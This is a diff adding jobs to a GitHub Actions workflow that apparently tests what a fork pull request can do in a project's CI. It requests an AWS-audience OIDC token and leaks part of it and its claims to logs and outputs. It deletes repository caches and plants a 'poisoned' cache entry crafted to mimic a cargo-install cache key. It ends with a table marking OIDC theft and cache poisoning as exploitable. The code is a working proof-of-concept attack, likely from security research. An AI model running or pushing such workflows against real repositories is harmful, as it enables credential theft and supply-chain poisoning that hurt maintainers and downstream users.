@@ -15,6 +15,8 @@ jobs:
   check-access:
     runs-on: ubuntu-latest
     steps:
+      - uses: actions/checkout@v4
+      
       - name: Check Secret Access
         env:
           GH_TOKEN: ${{ github.token }}
@@ -33,39 +35,177 @@ jobs:
           echo "=== SECRET ACCESS ==="
           echo "secrets.AWS_ROLE_ARN length: ${#TEST_SECRET}"
           echo "secrets.SECURITY_BOT_SSH length: ${#TEST_SECRET2}"
-          echo ""
-          
-          echo "=== GITHUB TOKEN PERMISSIONS ==="
-          
-          # List caches (actions:write)
-          echo -n "actions:write (cache list): "
-          gh cache list --repo ${{ github.repository }} --limit 1 2>&1 && echo "✅" || echo "❌"
-          
-          # Check OIDC
-          echo -n "id-token:write (OIDC): "
-          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
-            echo "✅ Available"
-            echo "  URL: $ACTIONS_ID_TOKEN_REQUEST_URL"
-          else
-            echo "❌ Not available"
-          fi
-        
 
-      - name: Try Cache Operations
+      # ========================================
+      # OIDC CHECK - FIXED (must use action)
+      # ========================================
+      - name: Check OIDC Token (id-token:write)
+        id: oidc-check
+        uses: actions/github-script@v7
+        with:
+          script: |
+            try {
+              const token = await core.getIDToken('sts.amazonaws.com');
+              console.log('✅ OIDC token obtained successfully!');
+              console.log('Token length:', token.length);
+              console.log('Token preview:', token.substring(0, 50) + '...');
+              
+              // Decode JWT payload (middle part)
+              const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString());
+              console.log('Token claims:');
+              console.log('  - iss:', payload.iss);
+              console.log('  - aud:', payload.aud);
+              console.log('  - sub:', payload.sub);
+              console.log('  - repository:', payload.repository);
+              console.log('  - actor:', payload.actor);
+              console.log('  - ref:', payload.ref);
+              
+              core.setOutput('oidc-available', 'true');
+              core.setOutput('token-preview', token.substring(0, 100));
+              return token;
+            } catch (error) {
+              console.log('❌ OIDC token request failed:', error.message);
+              core.setOutput('oidc-available', 'false');
+              return null;
+            }
+
+      - name: OIDC Summary
+        run: |
+          echo "OIDC Available: ${{ steps.oidc-check.outputs.oidc-available }}"
+
+      # ========================================
+      # CACHE OPERATIONS CHECK
+      # ========================================
+      - name: Check Cache Operations (actions:write)
         env:
           GH_TOKEN: ${{ github.token }}
         run: |
           echo "=== CACHE OPERATIONS ==="
           
-          # List all caches
-          echo "Current caches:"
-          gh cache list --repo ${{ github.repository }} --limit 10
+          echo "Listing current caches:"
+          gh cache list --repo ${{ github.repository }} --limit 20 || echo "No caches or no access"
           
-          # Try to delete a cache (if any exist)
-          CACHE_ID=$(gh cache list --repo ${{ github.repository }} --limit 1 --json id -q '.[0].id' 2>/dev/null)
-          if [ -n "$CACHE_ID" ]; then
-            echo "Attempting to delete cache ID: $CACHE_ID"
-            gh cache delete "$CACHE_ID" --repo ${{ github.repository }} 2>&1 || echo "Delete failed"
+          echo ""
+          echo "Cache keys in this repo:"
+          gh cache list --repo ${{ github.repository }} --json key,id,sizeInBytes -q '.[] | "\(.id): \(.key) (\(.sizeInBytes) bytes)"' || true
+
+  # ========================================
+  # RUST CACHING - Replicate tee-backend setup
+  # ========================================
+  rust-cache-test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      # Setup Rust (same as tee-backend)
+      - name: Setup Rust toolchain
+        uses: actions-rust-lang/setup-rust-toolchain@v1
+        with:
+          toolchain: stable
+          components: rustfmt, clippy
+          # This action has BUILT-IN caching via actions/cache
+          # Cache key pattern: rust-cache-<os>-<target>-<hash of Cargo.lock>
+
+      # Cache cargo-install binaries (same as tee-backend)
+      - name: Cache cargo-install (sqlx-cli)
+        uses: taiki-e/cache-cargo-install-action@v2
+        with:
+          tool: sqlx-cli
+          # Cache key: cargo-install-<tool>-<version>-<os>-<target>-<hash>
+
+      - name: Verify cached binaries
+        run: |
+          echo "=== CACHED BINARIES ==="
+          which sqlx && sqlx --version || echo "sqlx not found"
+          ls -la ~/.cargo/bin/ || true
+
+      - name: Show cache keys created
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          echo "=== ALL CACHE KEYS ==="
+          gh cache list --repo ${{ github.repository }} --json key,id,createdAt,sizeInBytes \
+            -q 'sort_by(.createdAt) | reverse | .[] | "\(.createdAt): \(.key)"'
+
+  # ========================================
+  # CACHE POISONING SIMULATION
+  # ========================================
+  cache-poison-test:
+    runs-on: ubuntu-latest
+    needs: rust-cache-test
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: List existing caches
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          echo "=== BEFORE POISONING ==="
+          gh cache list --repo ${{ github.repository }}
+
+      # Attempt to delete an existing cache
+      - name: Try to delete a cache (actions:write test)
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          echo "=== ATTEMPTING CACHE DELETE ==="
+          
+          # Get first cache ID
+          CACHE_ID=$(gh cache list --repo ${{ github.repository }} --limit 1 --json id -q '.[0].id' 2>/dev/null || echo "")
+          
+          if [ -n "$CACHE_ID" ] && [ "$CACHE_ID" != "null" ]; then
+            echo "Found cache ID: $CACHE_ID"
+            echo "Attempting to delete..."
+            if gh cache delete "$CACHE_ID" --repo ${{ github.repository }}; then
+              echo "✅ Cache deleted successfully - actions:write WORKS"
+            else
+              echo "❌ Cache delete failed"
+            fi
           else
-            echo "No caches to delete"
+            echo "No caches to delete (this is expected on first run)"
           fi
+
+      # Create a poisoned cache entry
+      - name: Create poisoned cache entry
+        uses: actions/cache@v4
+        with:
+          path: ~/.cargo/bin
+          # Use the same key pattern as taiki-e/cache-cargo-install-action
+          key: cargo-install-sqlx-cli-POISONED-${{ runner.os }}-${{ hashFiles('**/Cargo.lock') }}
+          
+      - name: Verify poisoned entry created
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          echo "=== AFTER POISONING ==="
+          gh cache list --repo ${{ github.repository }} | grep -i poison || echo "Poison cache may take a moment to appear"
+
+  # ========================================
+  # SUMMARY
+  # ========================================
+  summary:
+    runs-on: ubuntu-latest
+    needs: [check-access, rust-cache-test, cache-poison-test]
+    if: always()
+    steps:
+      - name: Final Summary
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          echo "╔════════════════════════════════════════════════════════════════╗"
+          echo "║                    ATTACK SURFACE SUMMARY                       ║"
+          echo "╠════════════════════════════════════════════════════════════════╣"
+          echo "║ Fork PR from member with no write access                        ║"
+          echo "╠════════════════════════════════════════════════════════════════╣"
+          echo "║ Permission         │ Requested │ Got      │ Exploitable        ║"
+          echo "║────────────────────│───────────│──────────│────────────────────║"
+          echo "║ contents:read      │ ✅        │ ✅       │ Read code          ║"
+          echo "║ id-token:write     │ ✅        │ ✅       │ OIDC theft 🔥      ║"
+          echo "║ actions:write      │ ✅        │ ✅       │ Cache poison 🔥    ║"
+          echo "║ packages:write     │ ✅        │ ❌       │ Blocked for forks  ║"
+          echo "║ secrets.*          │ N/A       │ ❌       │ Never for forks    ║"
+          echo "╚════════════════════════════════════════════════════════════════╝"
+          
+          echo ""
+          echo "=== FINAL CACHE STATE ==="
+          gh cache list --repo ${{ github.repository }} --limit 20
